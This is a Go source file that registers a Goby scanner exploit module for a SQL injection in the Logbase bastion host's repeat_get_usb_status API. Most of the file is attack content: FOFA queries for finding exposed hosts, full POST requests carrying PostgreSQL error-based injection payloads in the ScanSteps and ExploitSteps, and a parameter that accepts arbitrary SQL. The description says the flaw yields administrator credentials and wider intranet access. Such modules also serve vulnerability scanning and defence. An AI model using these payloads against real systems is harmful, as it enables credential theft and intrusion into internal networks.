package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Logbase Bastionhost repeat_get_usb_status Api SQL Injection Vulnerability",
    "Description": "<p>SAFETY is the first information security manufacturer specializing in operation safety management products and services in China, and has an industry-leading series of safety audit and operation and maintenance management products. It provides 7*24-hour operation safety management services, and its sales and service network covers major provinces and cities such as Beijing, Shanghai, Guangzhou, Xi'an, Jiangsu, Zhejiang, Henan, and Fujian. Its bastion host system before 2021 has a SQL injection vulnerability, an attacker can use this vulnerability to obtain the administrator's username and password, and then obtain more intranet host permissions</p>",
    "Impact": "<p>Logbase Bastionhost SQL Injection</p>",
    "Recommendation": "<p>Upgrade the software to the latest version.</p><p>Homepage link: https://www.logbase.cn/</p>",
    "Product": "Logbase Bastion Host",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "思福迪 Logbase 堡垒机 repeat_get_usb_status 接口 SQL 注入漏洞",
            "Product": "Logbase堡垒机",
            "Description": "<p>思福迪(SAFETY)是国内第一家专业从事运行安全管理产品与服务的信息安全厂商，拥有业界领先的安全审计和运维管理产品系列，提供7*24小时运行安全管理服务，销售和服务网络覆盖北京、上海、广州、西安、江苏、浙江、河南、福建等主要省市。<span style=\"color: var(--primaryFont-color);\">它旗下的2021年之前版本的堡垒机存在SQL注入漏洞，攻击者可以利用此漏洞获取管理员的用户名和密码，进而获取更多内网主机权限</span></p>",
            "Recommendation": "<p>升级系统到最新版。官网链接：<a href=\"https://www.logbase.cn/\">https://www.logbase.cn/</a></p>",
            "Impact": "<p>攻击者可以通过SQL注入漏洞获取堡垒机管理员的用户名和密码，进而控制更多内网机器。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Logbase Bastionhost repeat_get_usb_status Api SQL Injection Vulnerability",
            "Product": "Logbase Bastion Host",
            "Description": "<p>SAFETY is the first information security manufacturer specializing in operation safety management products and services in China, and has an industry-leading series of safety audit and operation and maintenance management products. It provides 7*24-hour operation safety management services, and its sales and service network covers major provinces and cities such as Beijing, Shanghai, Guangzhou, Xi'an, Jiangsu, Zhejiang, Henan, and Fujian. Its bastion host system before 2021 has a SQL injection vulnerability, an attacker can use this vulnerability to obtain the administrator's username and password, and then obtain more intranet host permissions<br></p>",
            "Recommendation": "<p>Upgrade the software to the latest version.</p><p><span style=\"color: var(--primaryFont-color); font-size: 16px;\">Homepage link:&nbsp;</span><span style=\"color: var(--primaryFont-color); font-size: 16px;\"><a href=\"https://www.logbase.cn/\">https://www.logbase.cn/</a></span><br></p>",
            "Impact": "<p>Logbase Bastionhost SQL Injection</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "banner=\"Set-Cookie: bhost=\" || header=\"Set-Cookie: bhost=\"",
    "GobyQuery": "banner=\"Set-Cookie: bhost=\" || header=\"Set-Cookie: bhost=\"",
    "Author": "Zther0@163.com",
    "Homepage": "https://www.logbase.cn/",
    "DisclosureDate": "2022-03-30",
    "References": [
        "https://fofa.info/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/bhost/repeat_get_usb_status",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Referer": "https://{{{host}}}/bhost/"
                },
                "data_type": "text",
                "data": "z1=1' or 7778=CAST((SELECT version())::text AS NUMERIC) --",
                "set_variable": []
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "返回状态码"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "PostgreSQL( +)[0-9]+(\\.[0-9]+)+",
                        "bz": "数据库版本号"
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/bhost/repeat_get_usb_status",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Referer": "https://{{{host}}}/bhost/"
                },
                "data_type": "text",
                "data": "z1=1' AND 5564=CAST((CHR(113)||CHR(113)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5564=5564) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC) AND 'nhda'='nhda",
                "set_variable": []
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "返回状态码"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qqjkq1qkxkq",
                        "bz": "sqlmap的payload"
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/bhost/repeat_get_usb_status",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Referer": "https://{{{host}}}/bhost/"
                },
                "data_type": "text",
                "data": "z1=1' or 7778=CAST((SELECT version())::text AS NUMERIC) --",
                "set_variable": []
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "返回状态码"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "PostgreSQL( +)[0-9]+(\\.[0-9]+)+",
                        "bz": "数据库版本号"
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/bhost/repeat_get_usb_status",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Referer": "https://{{{host}}}/bhost/"
                },
                "data_type": "text",
                "data": "z1=1' AND 5564=CAST((CHR(113)||CHR(113)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5564=5564) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC) AND 'nhda'='nhda",
                "set_variable": []
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "返回状态码"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qqjkq1qkxkq",
                        "bz": "sqlmap的payload"
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT version()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10360"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
